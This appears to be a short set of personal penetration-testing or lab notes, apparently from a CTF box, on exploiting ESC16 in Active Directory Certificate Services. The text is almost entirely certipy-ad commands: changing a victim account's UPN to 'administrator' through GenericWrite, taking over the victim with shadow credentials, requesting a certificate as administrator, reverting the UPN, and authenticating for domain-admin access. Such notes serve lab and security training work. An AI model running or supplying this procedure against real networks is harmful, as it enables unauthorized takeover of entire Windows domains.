to exploit ESC16, we need an account that has GenericWrite over another user
- in this case, p.agila has GenericWrite over ca_svc
![image 27 4.png](/image%2027%204.png)
- certipy-ad account -u '<attacker>@<domain>' -p '<pass>' -dc-ip <IP> -upn 'administrator' -user '<victim>' update
    
    - attacker has GenericWrite over victim
    
  
verify that the update went through
- the upn of the affected account should be administrator now
![image 28 4.png](/image%2028%204.png)
- certipy-ad account -u '<attacker>@<domain>' -p '<pass>' -dc-ip <IP> -user '<victim>' read
  
  
![image 29 4.png](/image%2029%204.png)
- certipy-ad shadow -u '<user>' -p '<pass>' -dc-ip <IP> -account <victim> auto
- export KRB5CCNAME=<victim>.ccache
  
![image 30 4.png](/image%2030%204.png)
- certipy-ad req -dc-ip <IP> -u 'administrator' -p '<victim_pass>' -ca '<CA>' -target '<target>' -template 'User’
    
    - if User doesn’t work you can try others but this is the default
    
  
to successfully complete ESC16 exploitation, you NEED to revert the UPN of the original account back or it won’t complete
![image 31 3.png](/image%2031%203.png)
- certipy-ad account -u <attacker>@<domain>' -p '<pass>' -dc-ip <IP> -upn '<victim>@<domain>' -user '<victim>' update
    
    - attacker has GenericWrite over victim
    
  
![image 32 3.png](/image%2032%203.png)
- certipy-ad auth -dc-ip <IP> -pfx administrator.pfx -username administrator -domain '<domain>’